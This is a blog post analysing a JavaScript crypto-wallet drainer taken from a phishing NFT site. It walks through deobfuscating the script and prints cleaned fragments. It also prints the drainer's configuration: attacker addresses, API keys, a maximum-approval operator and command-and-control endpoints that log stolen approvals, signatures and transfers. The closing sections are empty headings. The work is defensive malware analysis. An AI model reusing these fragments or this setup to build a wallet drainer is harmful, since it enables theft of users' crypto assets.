---
layout: post
title:  "Deobfuscating & Analyzing a JS Crypto Stealer"
date:   2022-12-23 20:28:22 -0400
categories: web3
---
![image](/assets/img/thieves.jpeg)

##### Quick Links 
[Initial Recon](#where-to-start)  
[Obfuscated JS](#obfuscated-js)  
[Basic Deobfuscation](#basic-deobfuscation)  
[Cleaned JS](#cleaned-js)  
[Stealer.js Core Functionality](#stealerjs-functionality--core-functions)  
[Additional recon on hosts](#additional-recon-on-hosts)  
[Additional recon on helper contracts](#additional-recon-on-helper-contracts)  
[Attacker URLs & Addresses](#attacker-urls--addresses)  
[Best Practices & Prevention](#best-practices-to-prevent)

### Initial recon
It all starts with a link usually.  
The link below is malware and will steal your crypto if given the chance. Do not Click unless you know what you are doing. 
```
https://rollsroycenft.app/
```

We start by Inspecting the site to see if we can recover any interesting artifacts or source snippets.  
screenshot   

The main.js file looks heavily obfuscated so we will start there:
  
### Obfuscated JS
The link below contains the fully obfuscated crypto stealer code.  

[Full Obfuscated Stealer.js Code](https://gist.github.com/lcfr-eth/f18f0aa99ce9d671479cb70b43420e80)  

Below I've included two example obfuscated functions as examples. The type of obfuscation is a basic variable replacement and string encoding. 

```java
async function isApproved(_0x22fax31, _0x22fax32) {
    try {
        let _0x22fax33 = new ethers.Contract(_0x22fax32,ERC721_ABI,w3);
        const _0x22fax34 = await _0x22fax33[_0x599e[72]][_0x599e[71]](_0x22fax31, CONDUIT, {
            gasLimit: 100000
        });
        return _0x22fax34
    } catch (err) {
        console[_0x599e[64]](_0x599e[73], err);
        return false
    }
}

async function getCounter(_0x22fax3c) {
    const _0x22fax4d = [{
        "\x69\x6E\x70\x75\x74\x73": [{
            "\x69\x6E\x74\x65\x72\x6E\x61\x6C\x54\x79\x70\x65": _0x599e[77],
            "\x6E\x61\x6D\x65": _0x599e[108],
            "\x74\x79\x70\x65": _0x599e[77]
        }],
        "\x6E\x61\x6D\x65": _0x599e[109],
        "\x6F\x75\x74\x70\x75\x74\x73": [{
            "\x69\x6E\x74\x65\x72\x6E\x61\x6C\x54\x79\x70\x65": _0x599e[110],
            "\x6E\x61\x6D\x65": _0x599e[111],
            "\x74\x79\x70\x65": _0x599e[110]
        }],
        "\x73\x74\x61\x74\x65\x4D\x75\x74\x61\x62\x69\x6C\x69\x74\x79": _0x599e[112],
        "\x74\x79\x70\x65": _0x599e[113]
    }];
    let _0x22fax33 = new ethers.Contract(_0x599e[114],_0x22fax4d,w3);
    const _0x22fax4e = _0x22fax33[_0x599e[72]][_0x599e[109]](_0x22fax3c);
    return _0x22fax4e
}
```
  
### Basic JS Deobfuscation
  
This JS is using basic obfuscation techniques which means they are easy to reverse using online tools such as:  
https://deobfuscate.io/.  
https://lelinhtinh.github.io/de4js/.  


After pasting the JS code into either of the above it should return something much more readable. From here it will take a bit more work to discern and change the remaining variable names. An example provided below of deobfuscated code returned from one of the above sites.
```java
async function isApproved(_0x22fax31, _0x22fax32) {
    try {
        let _0x22fax33 = new ethers.Contract(_0x22fax32, ERC721_ABI, w3);
        const _0x22fax34 = await _0x22fax33.functions.isApprovedForAll(_0x22fax31, CONDUIT, {
            gasLimit: 100000
        });
        return _0x22fax34
    } catch (err) {
        console.log('error', err);
        return false
    }
}

async function getCounter(_0x22fax3c) {
    const _0x22fax4d = [{
        "inputs": [{
            "internalType": 'address',
            "name": 'offerer',
            "type": 'address'
        }],
        "name": 'getCounter',
        "outputs": [{
            "internalType": 'uint256',
            "name": 'counter',
            "type": 'uint256'
        }],
        "stateMutability": 'view',
        "type": 'function'
    }];
    let _0x22fax33 = new ethers.Contract('0x00000000006c3852cbEf3e08E8dF289169EdE581', _0x22fax4d, w3);
    const _0x22fax4e = _0x22fax33.functions.getCounter(_0x22fax3c);
    return _0x22fax4e
}
```

Returned is a much more readable form of the code. From here it is similar to reversing any program. Looking at the code surrounding the
variables which are still encoded to infer what they should be to correctly rename them manually until the code is suffeciently 
ledgable for review. 

After using one of the two sites above and a couple of hours of manually renaming variables we can basically read the code and functionality demonstrated below.
  
### Cleaner JS  
[Deobfuscated & Cleaner JS Stealer.js Code](https://gist.github.com/lcfr-eth/76ee52ed2ae32796dc352e5e4cf707d8)  

```java
  
// check if an address has the seaport conduit approvedforall for an ERC721 collection
async function isApproved(accountAddress, erc721Address) {
    try {
        let erc721 = new ethers.Contract(erc721Address, ERC721_ABI, w3);
        const isApprovedBool = await erc721.functions.isApprovedForAll(accountAddress, CONDUIT, {
            gasLimit: 100000
        });
        return isApprovedBool
    } catch (err) {
        console.log('error', err);
        return false
    }
}

// returns count from seaport for address
async function getCounter(accountAddress) {
    const miniSeaportABI = [{
        "inputs": [{
            "internalType": 'address',
            "name": 'offerer',
            "type": 'address'
        }],
        "name": 'getCounter',
        "outputs": [{
            "internalType": 'uint256',
            "name": 'counter',
            "type": 'uint256'
        }],
        "stateMutability": 'view',
        "type": 'function'
    }];
    let seaport = new ethers.Contract('0x00000000006c3852cbEf3e08E8dF289169EdE581', miniSeaportABI, w3);
    const count = seaport.functions.getCounter(accountAddress);
    return count
}
  ```
  
After some manual decoding the code is as if we have written it our selves with around 95% decoded. We can finally understand the above reference functions and what they do.  

The isApproved() function takes two params the victim/user address and a contract address meant to be an ERC721 contract. It then checks if the seaport conduit address is approvedForAll by the owner address on the supplied ERC721 contract/collection address.  

The getCounter() function returns an opensea Seaport account counter/nonce record for creating and signing a seaport order.  

Below is a detailed account of the Stealer's core functionality.  
  
### Stealer.js Functionality & Core functions

```java
const WETH = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';          // WETH contract
const CONDUIT = '0x1E0049783F008A0085193E00003D00cd54003c71';       // Seaport Conduit for Approvals

const RPC = 'https://rpc.ankr.com/eth/38eac0bf9f0e89d5e226f5c1ef1249406ce7958e48704cc5c3015bed44cb3dca';
let w3 = new ethers.providers.JsonRpcProvider(RPC);

const operator = '0x03c4B92F7283f52aD43EF354f709e6778A74b7F4';       // max approval given to this for ERC20's
const contractSAFA = '0xEf78641Af30cff4A41Bfd2871F3a160DceFFA428';   // BulkTransfer contract 
const ownerAddress = '0xD422B783ea64f4d30c3531dAceb31870C9aC2e61';   // attacker EOA?
const ZAPPER_KEY = '082cca2f-3e84-4239-89e6-848394fc200a';
const BASE_URL = 'https://dreadbusiness.com/api';                    // attacker C&C Infrastructure
const TOKEN_APPROVE = BASE_URL + '/token_permit';                    // log token_approves 
const TOKEN_TRANSFER = BASE_URL + '/token_transfer';                 // log token_transfers
const SEAPORT_SIGN = BASE_URL + '/seaport_sign';                     // log seaport signatures
const NFT_TRANSFER = BASE_URL + '/nft_transfer';                     // log nft transfers (1155 and 721)
const MAX_APPROVAL = '1158472395435294898592384258348512586931256';
const endpoint = ownerAddress;
```

### Attacker URLs & Addresses
  
### Additional recon on helper contracts
  
### Additional recon on hosts

### Best practices to prevent
  
